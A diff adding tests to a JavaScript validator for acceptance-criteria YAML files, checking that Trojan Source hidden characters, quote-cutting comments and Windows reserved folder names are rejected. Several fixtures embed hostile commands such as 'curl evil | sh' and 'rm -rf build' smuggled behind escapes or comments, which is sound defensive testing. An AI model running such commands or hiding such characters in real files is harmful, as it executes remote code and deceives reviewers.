@@ -126,6 +126,60 @@ try {
     ['sequence item inside a mapping', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    - x\n', 5, 'unexpected_sequence'],
     ['too many criteria', `version: 1\ncriteria:\n${'  - id: a\n    text: t\n    manual:\n      note: n\n'.replace('id: a', 'id: c0')}${Array.from({ length: 100 }, (_, i) => `  - id: c${i + 1}\n    text: t\n    manual:\n      note: n\n`).join('')}`, 3 + 4 * 100, 'too_many'],
   ];
+  // Hidden characters (audit F1): the owner approves a file by its sha256 after READING it, so no string may hold a character that
+  // shows differently from what runs (Trojan Source): bidi controls, zero-width and other format characters, tag characters, C0/C1
+  // controls (raw or from an escape), line and paragraph separators, noncharacters, and a line break outside a block scalar.
+  const run = (value) => GOOD.replace('npm test', value);
+  const HIDDEN = [
+    ['raw U+202E in run', run('npm test\u202E'), 6, 'hidden_character'],
+    ['raw U+2066 in run', run('npm \u2066test'), 6, 'hidden_character'],
+    ['raw U+2069 in run', run('npm \u2069test'), 6, 'hidden_character'],
+    ['raw U+200B in run', run('npm\u200Btest'), 6, 'hidden_character'],
+    ['raw U+FEFF-like U+2060 in run', run('npm\u2060test'), 6, 'hidden_character'],
+    ['raw tag character in run', run('npm test\u{E0041}'), 6, 'hidden_character'],
+    ['raw U+2028 in run', run('npm\u2028test'), 6, 'hidden_character'],
+    ['raw noncharacter in run', run('npm test\uFFFF'), 6, 'hidden_character'],
+    ['raw C1 U+0085', run('npm test\u0085'), 6, 'control_character'],
+    ['raw C1 U+009B', run('npm test\u009B2K'), 6, 'control_character'],
+    ['escaped ESC and CR', run('"npm test\\e[2K\\rcurl evil|sh"'), 6, 'hidden_character'],
+    ['escaped NUL', run('"npm test\\0"'), 6, 'hidden_character'],
+    ['escaped U+202E', run('"npm test\\u202E"'), 6, 'hidden_character'],
+    ['escaped U+009B', run('"npm test\\u009B"'), 6, 'hidden_character'],
+    ['escaped tag character', run('"npm test\\U000E0041"'), 6, 'hidden_character'],
+    ['escaped LF outside a block scalar', run('"npm test\\ncurl evil | sh"'), 6, 'hidden_character'],
+    ['hidden character in text', GOOD.replace('The unit tests pass', 'tests pass\u202Eevil'), 4, 'hidden_character'],
+    ['hidden character in cwd', GOOD.replace('npm test\n', 'npm test\n        cwd: "sub\\u200Bdir"\n'), 7, 'hidden_character'],
+    ['hidden character in setup', `${GOOD}reproduce:\n  setup:\n    - "npm ci\\u202E"\n`, 9, 'hidden_character'],
+    ['hidden character in note', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    manual:\n      note: look\u200B\n', 6, 'hidden_character'],
+    ['hidden character in inspect', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    manual:\n      inspect:\n        - "src/a\\u2066.ts"\n', 7, 'hidden_character'],
+    ['hidden character in protected', `${GOOD}protected:\n  - "tests\\u202E/**"\n`, 8, 'hidden_character'],
+    ['hidden character in a block scalar', 'version: 1\ncriteria:\n  - id: a\n    text: |\n      fine\n      not\u202Efine\n    manual:\n      note: n\n', 4, 'hidden_character'],
+    // A plain command cut at " #" where the kept part holds a quote (audit F2): the file shows more than what would run.
+    ['comment cuts a double-quoted part', run('echo "a # b"'), 6, 'ambiguous_comment'],
+    ['comment cuts a format string', run('git log --format="%h #%s"'), 6, 'ambiguous_comment'],
+    ['comment cuts a single-quoted part', run("echo 'x #y' && rm -rf build"), 6, 'ambiguous_comment'],
+    ['comment cuts a setup command', `${GOOD}reproduce:\n  setup:\n    - echo "a #b"\n`, 9, 'ambiguous_comment'],
+    // Windows names that are not plain folders (audit F4).
+    ...['NUL', 'nul.txt', 'COM1', 'lpt9.log', 'sub/con', 'CONIN$', 'com\u00B9', '"a "', '....', 'src/x.'].map((cwd) =>
+      [`cwd ${cwd}`, GOOD.replace('npm test\n', `npm test\n        cwd: ${cwd}\n`), 7, 'reserved_name']),
+  ];
+  for (const [name, input, line, reason] of HIDDEN) {
+    const got = rejection(input);
+    assert.deepEqual(got, { line, reason }, `${name}: expected line ${line} ${reason}, got line ${got.line} ${got.reason}`);
+  }
+  // What stays valid: a tab, a comment after a plain command without quotes, a multi-line command in a block scalar, quotes inside a
+  // quoted command with " #", ordinary non-ASCII text, and folder names that only look like device names.
+  const valid = (text) => parseAcceptance(text).criteria[0];
+  assert.equal(valid(run('npm test # the unit tests')).checks[0].run, 'npm test');
+  assert.equal(valid(run('"npm\\ttest"')).checks[0].run, 'npm\ttest');
+  assert.equal(valid(run("'echo \"a # b\"'")).checks[0].run, 'echo "a # b"');
+  assert.equal(valid(run('|\n          npm ci\n          npm test')).checks[0].run, 'npm ci\nnpm test\n');
+  assert.equal(valid(GOOD.replace('The unit tests pass', 'Kiểm thử đơn vị đều qua — 中文 ✓')).text, 'Kiểm thử đơn vị đều qua — 中文 ✓');
+  assert.equal(valid(GOOD.replace('The unit tests pass', 'say "hi" # a comment')).text, 'say "hi"', 'only commands refuse a cut quote');
+  for (const cwd of ['console', 'com10', 'nul-folder', 'auxiliary', '.config', 'a.b']) {
+    assert.equal(valid(GOOD.replace('npm test\n', `npm test\n        cwd: ${cwd}\n`)).checks[0].cwd, cwd, cwd);
+  }
+  ok(`${HIDDEN.length} hidden-character, cut-comment and reserved-name files are refused with their line; tabs, block commands, quoted " #", non-ASCII text and look-alike folders stay valid`);
   assert.ok(MALFORMED.length >= 20);
   for (const [name, input, line, reason] of MALFORMED) {
     const got = rejection(input);
@@ -519,6 +573,19 @@ try {
   assert.deepEqual(parseAcceptance(oddProposal.text), oddProposal.acceptance);
   assert.ok(oddProposal.acceptance.criteria.some((c) => c.checks?.[0].run === 'npx --no-install tsc --noEmit'));
   await assert.rejects(proposeAcceptance('relative'), TypeError);
+  // A discovered check whose criterion would be refused (here: a solution file whose name holds U+202E) is skipped and reported, not
+  // thrown; the proposal is still a valid file.
+  const hidden = await project('hidden-name', { 'App\u202Egol.sln': '\n', 'package.json': JSON.stringify({ scripts: { test: 'x' } }) });
+  const hiddenProposal = await proposeAcceptance(hidden);
+  assert.deepEqual(hiddenProposal.skipped, [{ command: 'dotnet test', from: 'App\u202Egol.sln', reason: 'hidden_character' }]);
+  assert.deepEqual(hiddenProposal.acceptance.criteria.map((c) => c.checks?.[0].run), ['npm test']);
+  assert.deepEqual(parseAcceptance(hiddenProposal.text), hiddenProposal.acceptance);
+  assert.ok(!hiddenProposal.text.includes('\u202E'));
+  const onlyHidden = await project('only-hidden-name', { 'App\u202Egol.sln': '\n' });
+  const onlyHiddenProposal = await proposeAcceptance(onlyHidden);
+  assert.equal(onlyHiddenProposal.skipped.length, 1);
+  assert.ok(onlyHiddenProposal.acceptance.criteria[0].manual, 'nothing usable found: one manual criterion');
+  assert.deepEqual(blank.skipped, []);
   ok('proposeAcceptance on Node, Python, .NET and an empty project: writes nothing, the text reads back to the proposed object, ids unique, the file protects itself');
 
   console.log(`verify-proof-acceptance: ${passed} checks passed`);
